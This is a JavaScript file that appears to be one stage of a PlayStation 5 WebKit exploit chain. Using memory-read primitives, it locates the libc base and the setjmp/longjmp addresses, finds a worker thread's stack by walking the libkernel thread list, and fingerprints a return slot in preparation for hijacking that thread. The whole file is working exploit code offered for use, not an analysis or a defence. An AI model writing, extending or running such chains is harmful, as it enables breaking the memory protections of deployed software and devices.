// worker_discover_1340.js — Phase 1: worker-hijack DISCOVERY (reads only, no overwrites).
// Ported from Bagagwa_chain main.js (find_worker + return fingerprint + libc derive).
// All reads are .data/GOT/heaps (XOM-safe). Batched logs for the OOM window.
(async () => {
  const say = async (s) => { try { await log("[wdisc] " + s); } catch(e){} };
  const hx = (v) => { try { return "0x" + (BigInt(v) & 0xFFFFFFFFFFFFFFFFn).toString(16); } catch(e){ return "?"; } };
  const WK = BigInt(PS5.webkitBase||0), LK = BigInt(PS5.libkernelBase||0);
  const R64 = (a) => read64(a);
  const okBase = (b) => b > 0x800000000n && b < 0x900000000n && b % 0x4000n === 0n;

  // 1) libc base candidates (Bagagwa pairs first, PSAITO pair last)
  const pairs = [[0x334E098,0x5D9E0],[0x334F680,0x5D9E0],[0x334F6A8,0x5D990],[0x3350850,0x14700]];
  let LC = 0n, hit = "";
  for(const [slot,rva] of pairs){
    try{
      const c = (R64(WK+BigInt(slot)) - BigInt(rva)) & 0xFFFFFFFFFFFFn;
      if(okBase(c)){ LC = c; hit = "slot=0x"+slot.toString(16)+"/rva=0x"+rva.toString(16); break; }
    }catch(e){}
  }
  await say("libc="+(LC?hx(LC)+" via "+hit:"NONE")+" setjmp="+(LC?hx(LC+0x5D990n):"?")+" longjmp="+(LC?hx(LC+0x5D9E0n):"?"));

  // 2) worker handshake (5s cap)
  let worker = null;
  try{
    worker = new Worker("payloads/worker_slave.js");
    await Promise.race([
      new Promise((res)=>{ worker.onmessage=()=>res(1); worker.postMessage(0); }),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error("timeout")),5000))
    ]);
    await say("worker handshake OK");
  }catch(e){ await say("worker handshake FAILED ("+String(e&&e.message||e).slice(0,40)+")"); return; }

  // 3) thread-list walk, both list-head candidates
  const NEXT=0x38n, STK=0xA8n, SZ=0xB0n;
  let wstack = 0n, wvia = "";
  for(const headOff of [0x64218,0x6C218]){
    try{
      let t = R64(LK+BigInt(headOff));
      for(let i=0;i<64 && t!==0n;i++){
        const sz = R64(t+SZ);
        if(sz===0x80000n){ wstack = R64(t+STK); wvia="head=0x"+headOff.toString(16)+" steps="+i; break; }
        t = R64(t+NEXT);
      }
    }catch(e){}
    if(wstack) break;
  }
  await say("wstack="+(wstack?hx(wstack)+" via "+wvia:"NOT FOUND"));
  if(!wstack) return;

  // 4) return-slot fingerprint: single-read shortcut + one 0x7F000..0x80000 sweep
  const EXP = LK+0x1FD01n;
  let short = null;
  try{ short = (R64(wstack+0x7FB88n)===EXP) ? "MATCH" : "miss"; }catch(e){ short = "FAULT"; }
  let cnt = 0, first = 0n;
  try{
    for(let o=0x7F000n;o<0x80000n;o+=8n){
      if(R64(wstack+o)===EXP){ cnt++; if(!first) first=wstack+o; if(cnt>4) break; }
    }
  }catch(e){ cnt = -1; }
  await say("retfp shortcut[0x7FB88]="+short+" sweep count="+cnt+(first?" first="+hx(first):"")+" (want 1)");
  await say("VERDICT: libc+worker+stack+retfp all found => READY to port hijack | else report which line failed");
  try{ send_notification("wdisc done"); }catch(e){}
})();
